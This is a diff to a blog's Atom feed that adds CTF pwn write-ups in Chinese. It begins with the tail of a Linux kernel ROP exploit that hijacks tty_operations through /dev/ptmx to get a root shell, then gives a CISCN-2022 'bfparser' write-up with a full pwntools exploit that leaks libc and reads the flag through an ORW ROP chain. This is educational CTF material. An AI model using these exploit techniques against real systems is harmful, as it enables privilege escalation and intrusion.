+	rop[i++] = (size_t)get_root;  // ret2usr
+	rop[i++] = 0xffffffff81063694; // swapgs; pop rbp; ret;
+	rop[i++] = 0;
+	rop[i++] = 0xffffffff814e35ef; // iretq; ret;
+	rop[i++] = (size_t)get_root_shell; // rip
+	rop[i++] = usr_cs;
+	rop[i++] = usr_rflags;
+	rop[i++] = usr_rsp;
+	rop[i++] = usr_ss;
+
+	int fd3 = open(&quot;/dev/ptmx&quot;, O_RDWR|O_NOCTTY);
+	size_t fake_tty_operation[0x20] = {
+        			0xffffffff00000000,
+					0xffffffff00000001,
+					0xffffffff00000002,
+					0xffffffff00000003,
+					0xffffffff00000004,
+					0xffffffff00000005,
+					0xffffffff00000006,
+					0xffffffff00000007,
+					0xffffffff00000008,
+					0xffffffff00000009,
+					0xffffffff0000000a,
+					0xffffffff0000000b,
+					0xffffffff0000000c
+    		};
+	/*
+	fake_tty_operation[0] = 0xffffffff8100ce6e; // pop rax; ret;
+	fake_tty_operation[1] = rop[0];
+	for(int j=2;j&lt;5;j++)
+		fake_tty_operation[j] = 0xffffffff8100ce6f; // ret;
+	fake_tty_operation[5] = 0xffffffff8105c144;  // pop rbx; ret;
+	fake_tty_operation[6] = 0xffff880006f31c00;
+	*/
+	for(int j=0;j&lt;5;j++)
+		fake_tty_operation[j] = rop[j];
+	fake_tty_operation[5] = 0xffffffff8100ce6f; // ret;
+	for(int j=6;j&lt;14;j++)
+		fake_tty_operation[j] = rop[j-1];
+	
+	fake_tty_operation[7] = 0xffffffff8181bfc5; // mov rsp, rax; dec ebx; ret;
+
+	size_t fake_tty_struct[4] = {0};
+	read(fd2, fake_tty_struct, 32);
+	fake_tty_struct[3] = (size_t)fake_tty_operation; // hijack *ops
+	write(fd2, fake_tty_struct, 32);
+
+	char buf[0x10] = {0};
+	write(fd3, buf, 0x8);  // tty_operation -&gt; write
+	return 0;
+}
+</code></pre>
+<figure data-type="image" tabindex="25"><img src="https://img.le1a.com/2022/12/26/f32c94bfdb173.png" alt="1672035607644.png" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CISCN-2022-西南分区赛PWN WP]]></title>
+        <id>https://kotoriseed.github.io/post/siscn西南分区赛 pwn/</id>
+        <link href="https://kotoriseed.github.io/post/siscn西南分区赛 pwn/">
+        </link>
+        <updated>2022-06-27T04:25:19.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="bfparser">bfparser</h1>
+<h2 id="分析">分析</h2>
+<figure data-type="image" tabindex="1"><img src="https://img.le1a.com/2022/06/27/21f21a7acbd10.png" alt="1656297240746.png" loading="lazy"></figure>
+<p>保护是全开了的。</p>
+<p>看看main函数</p>
+<figure data-type="image" tabindex="2"><img src="https://img.le1a.com/2022/06/27/90d93db931fe0.png" alt="1656297278557.png" loading="lazy"></figure>
+<p>分配了一个0x1000的chunk来写入数据。在sub_13BA()里进行了一定的预处理。</p>
+<p>然后开了沙箱，只能orw</p>
+<figure data-type="image" tabindex="3"><img src="https://img.le1a.com/2022/06/27/960d481a96656.png" alt="1656298451568.png" loading="lazy"></figure>
+<p>关键漏洞出在sub_163F()</p>
+<figure data-type="image" tabindex="4"><img src="https://img.le1a.com/2022/06/27/4564d4d49cffd.png" alt="1656297389262.png" loading="lazy"></figure>
+<p>这里有一个<code>__asm{ jmp rax }</code>，估计是跳表需要修复，懒得修了，直接看汇编吧</p>
+<figure data-type="image" tabindex="5"><img src="https://img.le1a.com/2022/06/27/01af486ed28b1.png" alt="1656297448778.png" loading="lazy"></figure>
+<p>可以看到，根据输入的东西不同，执行不一样的操作。结合标题的bf，可以想到<code>brainfuck</code>语言</p>
+<figure data-type="image" tabindex="6"><img src="https://img.le1a.com/2022/06/27/e6a4e3913567f.png" alt="1656297623187.png" loading="lazy"></figure>
+<p>百度了之后，发现bf语言的语法其实非常简洁。值得注意的是，他有移动指针和修改指针内容的功能。</p>
+<figure data-type="image" tabindex="7"><img src="https://img.le1a.com/2022/06/27/0fd0f0387aa12.png" alt="1656297698315.png" loading="lazy"></figure>
+<p>此函数是通过<code>v2</code>这个变量模拟的bf语言运行的空间。不难看出，移动指针可以导致栈溢出。</p>
+<figure data-type="image" tabindex="8"><img src="https://img.le1a.com/2022/06/27/83de348633043.png" alt="1656297878295.png" loading="lazy"></figure>
+<p>他的指针操作是由一个变量当做下标来实现的，不幸的是，他一次只会移动1字节。</p>
+<p>如果单纯使用<code>'&gt;'*n</code>的方式来移动的话，他初始位于rbp-0x210，想要劫持到返回地址就需要0x218*8个字节的数据，已经超过了题目给的0x1000。</p>
+<p>一开始我想的是劫持[rbp-0x214]这个指针，但是由于个人太菜了，没有成功。(感觉是负数的问题)</p>
+<p>于是去想办法简化bf语言的payload。</p>
+<p>最后想到的是用 <code>+[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;,]</code> 通过自己的输入来有限控制指针循环移动</p>
+<p>然后经过不断的二分调试，最终确定了payload让指针到了返回地址</p>
+<p>（这里劫持的是main函数的栈帧，也就是 <code>__libc_start_main+243</code>）</p>
+<pre><code>pay = '+[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;,]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;'
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://img.le1a.com/2022/06/27/52fcf4d7bc9c4.png" alt="1656299307186.png" loading="lazy"></figure>
+<p>劫持到这里主要是觉得方便leak libc和栈基址。（中途脑袋抽了，还把pie基址一块leak了，当时想的是rop要用gadgets，然而最后还是直接用的libc的gadgets）</p>
+<p>leak之后就简单了，直接rop去写orw。</p>
+<h2 id="exp">exp</h2>
+<pre><code class="language-python">from pwn import *
+context(os='linux', arch='amd64', log_level='debug')
+p = process('./pwn')
+elf = ELF('./pwn')
+libc = ELF('./libc.so.6')
+# p = remote('192.168.0.76', 58011)
+# p.recvuntil('TEST')
+'''
+pop_rdi = 0x0000000000000973 # pop rdi ; ret
+ret = 0x000000000000001a # ret
+'''
+pay = '+[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;,]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;'
+
+pay += '&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;'*2
+pay += '.&gt;'*8
+pay += '&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;'
+
+pay += '.&gt;'*8
+pay += '&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;'*5
+
+pay += '.&gt;'*8
+pay += '&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;'
+pay += ',&gt;'*8 * 22
+
+# pay += '.'
+
+# gdb.attach(p)
+
+dd = '0'*0x40 + '\x00'
+
+p.sendline(pay)
+gdb.attach(p)
+
+p.send(dd)
+
+stack = u64(p.recvuntil(b'\x7f')[-6:].ljust(0x8, b'\x00'))-0xf0
+print(hex(stack))
+
+pie = u64(p.recvuntil(b'\x55')[-6:].ljust(0x8, b'\x00')) - 0x854
+print(hex(pie))
+
+libcbase = u64(p.recvuntil(b'\x7f')[-6:].ljust(0x8, b'\x00')) - 0x24083
+print(hex(libcbase))
+'''
+one = [0xe3afe, 0xe3b01, 0xe3b04]
+# print(hex(libcbase + one[0]))
+p.sendline(p64(one[2]+libcbase))
+'''
+pop_rdi = libcbase + 0x0000000000023b6a # pop rdi ; ret
+pop_rsi = libcbase + 0x000000000002601f # pop rsi ; ret
+pop_rdx = libcbase + 0x0000000000142c92 # pop rdx ; ret
+
+op = libcbase + libc.symbols['open']
+re = libcbase + libc.symbols['read']
+wr = libcbase + libc.symbols['write']
+
+pay = p64(pop_rdi) + p64(stack+8*21) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(op)
+pay += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(stack-0x100) + p64(pop_rdx)+p64(0x30)+p64(re)
+pay += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(stack-0x100) + p64(pop_rdx)+p64(0x30)+p64(wr)
+pay += b'./flag\x00\x00'
+p.send(pay)
+
+p.interactive()
+</code></pre>
+]]></content>
+    </entry>
+</feed>
